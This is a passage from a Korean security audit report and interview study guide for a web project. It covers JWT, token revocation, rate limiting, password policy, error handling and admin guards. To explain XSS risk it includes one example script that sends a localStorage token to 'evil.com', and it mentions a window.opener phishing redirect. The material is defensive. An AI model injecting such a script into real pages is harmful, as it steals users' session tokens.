- 둘이 공존하면 검증 일관성 보장 어려움.

**audience 강제 패턴**:
```ts
jwt.verify(token, SECRET, {
  algorithms: ['HS256'],       // alg confusion 방어
  audience: 'session',          // type confusion 방어
  issuer: 'pLAWcess',
});
```

**Key Rotation**:
- 운영 중 secret 교체 필요 시 단순 변경하면 기존 토큰 모두 무효.
- 해결: `kid` (key ID) 헤더 + 여러 키 동시 유지 → 점진적 교체.
- 비대칭 키 사용 + JWKS 엔드포인트 (`/.well-known/jwks.json`).

**Refresh Token 패턴**:
- Access token (15분 TTL) + Refresh token (7일 TTL, DB 저장).
- Access 만료 시 refresh 로 새로 발급.
- Refresh token rotation: 사용 시마다 새로 발급 + 이전 것 무효화 → 탈취 탐지 가능.

**본 프로젝트 선택**:
- `jose` 통일 (Edge 호환).
- 모든 verify 에 audience 강제 (점진적 마이그레이션).
- 중기: refresh token + token_version 도입.

#### 4) 면접 포인트
- "JWT 의 장단점?" → 장점: stateless, scale 쉬움. 단점: revocation 어려움, 크기 큼.
- "JWT vs Session?" → Session 은 server-side 상태, 즉시 revoke 가능. JWT 는 stateless, revocation 위해 별도 메커니즘 필요.
- "`alg: none` 공격 들어봤나?" → 초기 lib 버그, 명시적 alg allowlist 로 방어.
- "Algorithm Confusion 공격이란?" → RS256 vs HS256 혼동 유발, alg allowlist 로 방어.
- "토큰을 어디에 저장?" → HttpOnly cookie > sessionStorage > localStorage 순으로 안전.

---

## 3. MEDIUM 등급 심층 분석

### M1. 토큰 Revocation 부재

#### 1) 흔한 상황인가? — **매우 흔함**
- JWT 의 stateless 특성과 트레이드오프. 대부분 시작은 "logout = cookie 삭제" 로 끝남.

#### 2) 발생 원인
- JWT 는 서명만 검증 → DB lookup 없음 → 만료 전까지 무효화 불가.
- "탈취된 토큰을 어떻게 즉시 무효화하나?" 는 JWT 가 풀지 못하는 본질적 한계.

#### 3) 해결책

**옵션 A — Token Version** (가장 간단):
```ts
// User 테이블에 token_version int 컬럼 추가
// JWT payload 에 token_version 포함
// verify 시 DB 의 token_version 과 일치 확인
// 로그아웃·비밀번호 변경 시 increment
```
- 장점: 구현 단순, 추가 인프라 불필요.
- 단점: 매 요청 DB lookup (캐시 필요).

**옵션 B — JTI Blacklist**:
- 각 토큰에 고유 `jti` → Redis 에 만료 시각까지 blacklist.
- 장점: precise 한 revocation.
- 단점: Redis 운영.

**옵션 C — Short Access + Refresh Token**:
- Access token 15분 (revocation 불필요, 곧 만료).
- Refresh token DB 저장 → 무효화 가능.
- 장점: 표준 패턴, OAuth 와 호환.
- 단점: 구현 복잡.

**본 프로젝트 선택**: 옵션 A (token_version) → 단순 + 충분.

#### 4) 면접 포인트
- "JWT 가 stateless 인데 어떻게 logout 을 구현하나?" → 클라이언트 측 쿠키 삭제 + 서버측 무효화 (위 3옵션 중 선택).
- "Refresh token rotation 이 왜 보안에 좋나?" → 탈취 감지 가능. 정상 사용자가 이전 refresh 쓰면 → 누가 이미 사용함 → 모든 세션 무효화.

---

### M2. Rate Limit 인메모리

#### 1) 흔한 상황인가? — **매우 흔함**
- 로컬 개발에선 동작 → serverless 배포 후 효과 없음.

#### 2) 발생 원인 — 기술 기반

**Serverless 의 인스턴스 모델**:
- Vercel/Lambda: 각 요청이 cold start 가능. Warm instance 도 일정 시간 후 폐기.
- 메모리 변수 = 프로세스 scope = 인스턴스별 분리.
- Multi-region 배포 시 region 마다 별도.

**Rate Limit 알고리즘**:
1. **Fixed Window**: 1분당 N회. 경계에서 burst 가능 (59초·60초에 각 N → 1초 안에 2N).
2. **Sliding Window**: 정확한 N회/단위시간. 구현 복잡.
3. **Token Bucket**: 토큰이 일정 속도로 채워짐 → 요청 시 소비. burst 허용 + 평균 속도 제한.
4. **Leaky Bucket**: Token Bucket 의 dual — 일정 속도로 흘러나감.

#### 3) 해결책

**Redis 기반** (표준):
- `INCR key` + `EXPIRE` (단순 fixed window).
- Lua script 로 sliding window 구현.
- 라이브러리: `@upstash/ratelimit` (serverless 친화).

**Cloud 서비스**:
- Cloudflare Rate Limiting (CDN 단).
- AWS WAF Rate-Based Rules.
- Vercel Edge Config + middleware.

**본 프로젝트 선택**: Upstash Redis (Vercel 호환, free tier).

#### 4) 면접 포인트
- "Token Bucket 과 Leaky Bucket 차이?" → 둘 다 비슷한 효과지만, Token Bucket 은 burst 허용, Leaky Bucket 은 균등 속도.
- "Distributed rate limit 의 어려움?" → multi-region 동기화 비용, race condition (CAS 또는 Lua script 로 atomic).

---

### M3. SessionStorage 에 Reset Token

#### 1) 흔한 상황인가? — 흔함
- SPA 라우팅 간 데이터 전달의 단골 패턴.

#### 2) 발생 원인 — 기술 기반

**Web Storage 의 보안 특성**:
| | localStorage | sessionStorage | HttpOnly Cookie |
|---|---|---|---|
| JS 접근 | ✓ | ✓ | ✗ |
| XSS 시 노출 | ✓ | ✓ | ✗ |
| 페이지 재로딩 시 | 유지 | 유지 (탭 한정) | 유지 |
| 자동 전송 | ✗ | ✗ | ✓ (요청마다) |
| 용량 | ~5MB | ~5MB | 4KB |

**XSS 의 영향**:
- `<script>fetch('//evil.com?t=' + localStorage.getItem('token'))</script>` 한 줄로 탈취.
- HttpOnly cookie 는 JS 가 못 읽어서 이 공격 불가.

#### 3) 해결책

**Reset Token 의 특수성**:
- 비밀번호 변경 권한 = 매우 강력.
- 짧은 유효시간 + 1회 사용 + 사용 후 즉시 무효화 필요.

**옵션**:
1. **URL fragment** (`#token=...`): 서버로 안 보내짐, JS 만 접근. fragment 는 Referer 에 안 들어감.
2. **OTP (6자리)**: 짧고, 외워 입력 가능, brute-force 제한.
3. **Path-scoped HttpOnly cookie**: 백엔드 발급, `/api/auth/reset-password` 한정.

**본 프로젝트 선택**: OTP 또는 path-scoped 쿠키 검토.

#### 4) 면접 포인트
- "왜 토큰을 localStorage 에 넣으면 안 되나?" → XSS 시 탈취. HttpOnly 의 핵심 가치.
- "URL fragment 가 query string 보다 안전한 이유?" → 서버 로그·Referer 에 안 들어감.

---

### M4. 비밀번호 복잡도 정책 약함

#### 1) 흔한 상황인가? — **매우 흔함**
- 길이만 검증하는 사이트 절반 이상.
- 반대로 과한 규칙 ("대소문자+숫자+특수문자 모두 필수") 도 흔하지만 NIST 는 권장 안 함.

#### 2) 발생 원인

**NIST SP 800-63B 권장 (2017 이후)**:
- ✓ 길이 8자 이상 (가능하면 12+).
- ✓ Known breached password (HIBP DB) 차단.
- ✗ 복잡도 규칙 (대소문자/숫자/특수문자 강제) — 사용성 저하, 보안 효과 미미.
- ✗ 정기 변경 강제 — 오히려 약화 (사람들이 P@ssw0rd1 → P@ssw0rd2 로 변경).
- ✗ Hint 질문.

**Entropy 계산**:
- 길이가 entropy 에 가장 큰 영향. `correcthorsebatterystaple` (28자 평이) > `Tr0ub4dor&3` (11자 복잡).

#### 3) 해결책

**라이브러리**:
- **zxcvbn** (Dropbox): 점수 0-4. 3 이상 권장.
- **have-i-been-pwned API**: k-anonymity 로 비밀번호 hash 앞 5자만 전송 → 유출 여부 확인.
- **passport-password-validator** 등.

**Deny-list**:
- Top 10000 흔한 비밀번호 (`password`, `qwerty`, `123456`).

**본 프로젝트 선택**: zxcvbn 점수 ≥ 3 + Top 1000 deny-list.

#### 4) 면접 포인트
- "왜 비밀번호 정기 변경이 보안에 안 좋나?" → 사용자가 약한 패턴 사용 → 학습 비용 증가.
- "Password hashing 알고리즘 비교?" → bcrypt (느림, 메모리 X) < scrypt (메모리 hard) < Argon2 (현대 표준, 메모리 + 병렬성 조절).
- "Salt 의 역할?" → rainbow table 공격 방어. 사용자별 unique.
- "bcrypt rounds 12 의 의미?" → 2^12 = 4096 iteration. 단일 hash 약 300ms (의도된 느림).

---

### M5. 에러 스택트레이스 노출 가능성

#### 1) 흔한 상황인가? — 흔함
- 디버깅용 stack trace 가 prod 까지 가는 경우.

#### 2) 발생 원인

**프레임워크별 default**:
- Next.js: prod build 에서 stack trace 자동 숨김 (5xx 응답에 generic 메시지).
- Express: default 로 stack 노출 → `app.use(errorHandler)` 명시 필요.
- Django DEBUG=True: 매우 상세한 페이지 노출 (유명 사고 원인).

**Prisma 에러의 정보 누설**:
- `P2002` (unique constraint): 어떤 컬럼이 unique 인지 노출.
- `P2025` (record not found): 존재 여부 노출 → user enumeration.
- 모든 PrismaClientKnownRequestError 는 메타데이터 포함.

#### 3) 해결책

**공통 에러 핸들러**:
```ts
export async function withErrorHandler(handler: () => Promise<NextResponse>) {
  try {
    return await handler();
  } catch (e) {
    if (e instanceof ApplicationError) {
      return NextResponse.json({ error: e.message }, { status: e.status });
    }
    if (e instanceof Prisma.PrismaClientKnownRequestError) {
      // 사용자에게는 generic, Sentry 에는 상세
      Sentry.captureException(e);
      return NextResponse.json({ error: 'Internal error' }, { status: 500 });
    }
    Sentry.captureException(e);
    return NextResponse.json({ error: 'Internal error' }, { status: 500 });
  }
}
```

**Sentry / Datadog**:
- 서버 측에서 stack trace 수집.
- 사용자 응답은 generic.

**본 프로젝트 선택**: 공통 핸들러 + Prisma 코드 매핑 + Sentry 도입 검토.

#### 4) 면접 포인트
- "에러 메시지가 너무 상세하면 왜 위험?" → DB 구조, 내부 path, 라이브러리 버전 노출 → 공격 표면 정보 제공.
- "User enumeration 이 뭐고 어떻게 방어?" → 로그인·아이디찾기·비번찾기에서 "존재" vs "비존재" 응답 차이로 계정 목록 수집. → 응답 통일 + 타이밍 통일.

---

### M6. Admin 클라이언트 Role 가드 누락

#### 1) 흔한 상황인가? — **매우 흔함**
- FE 만 가드 (BE 까먹음) → 진짜 위험.
- BE 만 가드 (FE 까먹음) → 깨진 UX + 점진적 위험.

#### 2) 발생 원인

**Defense in Depth 위반**:
- 단일 방어선에만 의존.
- 본 프로젝트는 BE 가 강하므로 정보 누출은 없지만, FE 추가 변경 시 사고 위험.

**Next.js App Router 의 가드 위치**:
| 위치 | 시점 | 특성 |
|---|---|---|
| Middleware (`middleware.ts`) | Edge, 요청 직후 | 가장 빠름, redirect 쉬움 |
| Server Component layout | 렌더 시작 시 | cookie 직접 접근, redirect 가능 |
| Server Component page | 페이지별 | 동일 |
| Client component `useEffect` | 마운트 후 | FOUC 발생, 가장 약함 |

#### 3) 해결책

**Server Component layout 패턴**:
```tsx
// apps/web/src/app/admin/layout.tsx
import { cookies } from 'next/headers';
import { redirect } from 'next/navigation';
import { serverFetch } from '@/lib/server-fetch';

export default async function AdminLayout({ children }) {
  const token = (await cookies()).get('plawcess_token')?.value;
  if (!token) redirect('/login');
  const me = await serverFetch('/api/auth/me', token);
  if (me?.current_role !== 'admin') redirect('/');
  return <>{children}</>;
}
```

**본 프로젝트 선택**: Server Component layout 검사 추가.

#### 4) 면접 포인트
- "왜 클라이언트 측 가드만으로는 안 되나?" → JS 비활성, 요청 직접 호출 등으로 우회.
- "Defense in depth 원칙?" → 다층 방어. 한 층 뚫려도 다음 층에서 차단.

---

## 4. LOW 등급 요약

| ID | 항목 | 흔한가 | 핵심 원인 | 해결 |
|---|---|---|---|---|
| L1 | SameSite=Strict 미적용 | 흔함 | UX 트레이드오프 (외부 링크 시 로그아웃 보임) | Strict 검토 또는 별도 cookie 분리 |
| L2 | 계정 brute-force lockout 없음 | 흔함 | IP 기반 rate limit 만 적용 | 5회 실패 시 임시 잠금 + 캡차 |
| L3 | CORS allowlist 하드코딩 | 매우 흔함 | 배포 후 도메인 추가 시 코드 변경 필요 | `ALLOWED_ORIGINS` env |
| L4 | `pnpm audit` 미자동화 | 흔함 | 수동 실행 의존 | CI weekly cron + Dependabot |
| L5 | `next.config.images.remotePatterns` 미설정 | 흔함 | 명시적 설정 안 하면 default 제한 | 도메인 allowlist |
| L6 | `rel="noopener noreferrer"` 누락 | 매우 흔함 | `target="_blank"` 의 부작용 인지 부족 | ESLint rule + 자동 수정 |

### L6 부연 — `target="_blank"` 의 위험
- 새 탭이 `window.opener` 로 부모 페이지 접근 가능 → `window.opener.location = 'evil.com'` 으로 phishing.
- 최신 브라우저는 default 로 noopener 적용하지만 구버전 호환을 위해 명시.

---

## 5. 횡단 주제 (Cross-cutting Themes)

### 5.1 신뢰 경계 (Trust Boundary)
모든 보안 결함의 공통 패턴: **신뢰할 수 없는 입력을 신뢰함**.
- 클라이언트 입력 (body, headers, cookies, formData)
- 외부 API 응답
- DB 에서 다시 읽은 값 (간접적 사용자 입력일 수 있음)

→ 모든 경계에서 검증.

### 5.2 시크릿 라이프사이클
1. **생성**: 강한 엔트로피 (32바이트 이상, 안전한 RNG).
2. **저장**: 환경변수 / 시크릿 매니저 / Vault. 절대 코드/Git.
3. **사용**: 최소 권한 원칙, 짧은 메모리 보유.
4. **회전**: 정기적 + 노출 시 즉시.
5. **소멸**: 안전한 폐기.

### 5.3 인증 vs 인가
- **인증 (Authentication)**: "당신이 누구인가" — JWT verify, 비밀번호 검증.
- **인가 (Authorization)**: "당신이 무엇을 할 수 있는가" — role check, IDOR 방어.
- 본 프로젝트:
  - 인증 = `verifyToken` + `proxy.ts`.
  - 인가 = `requireAdmin`, 라우트별 user_id 매칭.

### 5.4 로깅 & 감사
- 본 보고서가 다루지 못한 영역 (별도 감사 필요).
- 인증 실패·권한 거부·민감 동작은 모두 로깅.
- 로그 자체가 PII/secret 포함하지 않도록.

### 5.5 Privacy by Design
- 데이터 최소 수집 (예: 이름·이메일만 필요한데 주민번호 받지 말 것).
- 응답 시 최소 노출 (Prisma `select` 명시).
- 본 프로젝트의 `password_hash` 수동 destructure 는 좋은 패턴이지만 fragile.

---

## 6. 면접 예상 질문 & 답안 포인트

### 6.1 기본 개념
- **Q**: "OWASP Top 10 중 가장 중요하다고 생각하는 것?"
- **A**: A01 Broken Access Control. 인가 결함은 한 번 발생하면 전체 시스템 신뢰 붕괴. 본 프로젝트도 admin role 가드를 2중 (proxy + requireAdmin) 으로 적용.

### 6.2 인증
- **Q**: "JWT 와 Session 의 차이는?"
- **A**: JWT 는 stateless, 서명 검증으로 동작 → DB 없이 검증 가능 → scale 쉬움. Session 은 server-side state → 즉시 revoke 가능. JWT 의 revocation 어려움은 short TTL + refresh token + token_version 으로 완화.

- **Q**: "비밀번호를 어떻게 저장?"
- **A**: 단방향 hash + salt. 알고리즘은 bcrypt/scrypt/Argon2 중 선택. 본 프로젝트는 bcrypt rounds 12. Argon2 가 현대 표준이지만 bcrypt 도 충분.

### 6.3 인가
- **Q**: "IDOR 이란?"
- **A**: Insecure Direct Object Reference. URL/body 의 id 가 다른 사용자 리소스 가리킬 때 소유권 검증 안 하면 발생. 본 프로젝트의 `/api/admin/users/[userId]` 는 admin 권한 자체가 모든 user 접근을 허용하므로 IDOR 은 아니지만, mentee API 들은 `getTokenFromCookie(req)?.user_id` 와 path param 매칭으로 방어.

### 6.4 웹 공격
- **Q**: "XSS 종류?"
- **A**: ① Stored (DB 저장 후 렌더), ② Reflected (URL 파라미터 즉시 반영), ③ DOM-based (JS 가 직접 DOM 조작). 방어: 출력 시 escape (React 자동), CSP, HttpOnly cookie (토큰 탈취 방어).

- **Q**: "CSRF 와 XSS 차이?"
- **A**: XSS 는 공격자 코드를 피해자 브라우저에서 실행. CSRF 는 피해자가 모르게 요청 발생. 방어: XSS = escape + CSP. CSRF = SameSite cookie + CSRF token + Origin 검증.

### 6.5 실무 판단
- **Q**: "보안과 사용성이 충돌할 때?"
- **A**: 사용자 시나리오와 위험 수준 평가. 본 프로젝트 SameSite=Lax 선택은 외부 링크 클릭 시 자동 로그인 유지를 위함. Strict 가 더 안전하지만 UX 손실. 대신 다른 방어선 (HttpOnly, Secure, 짧은 TTL) 으로 보완.

---

## 7. 추가 학습 자료

### 7.1 문서
- **OWASP**: https://owasp.org/Top10/ — 매년 갱신.
- **OWASP Cheat Sheets**: 주제별 핵심 정리 (JWT, REST Security, Password Storage 등).
- **NIST SP 800-63B**: 비밀번호 정책 권장.
- **MDN Web Docs**: HTTP 헤더, CORS, CSP 표준 레퍼런스.
- **RFC**: 7519 (JWT), 6749 (OAuth 2.0), 6265 (Cookies).
- **KISA 보안 가이드**: 국내 가이드 (한국인터넷진흥원).

### 7.2 도구 (학습용 실습)
- **OWASP Juice Shop**: 의도적 취약점 웹앱, 단계별 챌린지.
- **PortSwigger Web Security Academy**: 무료 lab, XSS·SQLi·CSRF 실습.
- **HackTheBox / TryHackMe**: 실전 시뮬레이션.
- **DVWA (Damn Vulnerable Web App)**.

### 7.3 도구 (실무)
- **gitleaks / trufflehog**: secret scanning.
- **Snyk / Dependabot**: 종속성 audit.
- **ZAP / Burp Suite**: 동적 분석.
- **Semgrep / CodeQL**: 정적 분석.
- **securityheaders.com / Mozilla Observatory**: 헤더 점수.

### 7.4 책
- **The Tangled Web** (Michal Zalewski)
- **Web Application Hacker's Handbook**
- **Real-World Cryptography** (David Wong)

---

## 8. 부록 — 본 프로젝트 발견 항목 빠른 참조

| ID | 등급 | 항목 | 파일 | OWASP |
|---|---|---|---|---|
| C1 | CRITICAL | CORS 와일드카드 + 자격증명 릴레이 | `mentee/grades/route.ts` | A01, A04 |
| C2 | CRITICAL | 파일 업로드 무검증 | `mentee/personal-statement/route.ts` | A08 |
| C3 | CRITICAL | CI 시크릿 평문 | `.github/workflows/ci.yml` | A05 |
| H1 | HIGH | 쿠키 Secure 누락 | `lib/auth.ts:43` | A02 |
| H2 | HIGH | 보안 헤더 전무 | `next.config.*` | A05 |
| H3 | HIGH | JWT 라이브러리 이중화 + audience 비강제 | `auth.ts`, `proxy.ts` | A07 |
| M1 | MEDIUM | 토큰 revocation 부재 | `lib/auth.ts` | A07 |
| M2 | MEDIUM | Rate limit 인메모리 | `lib/email/code.ts` | A04 |
| M3 | MEDIUM | sessionStorage reset token | `reset-password/page.tsx` | A02 |
| M4 | MEDIUM | 비밀번호 정책 약함 | `auth/signup/route.ts` | A07 |
| M5 | MEDIUM | 에러 스택트레이스 가능성 | 다수 | A09 |
| M6 | MEDIUM | Admin 클라이언트 가드 누락 | `admin/layout.tsx` | A01 |
| L1-L6 | LOW | (요약 §4) | 다수 | 다수 |
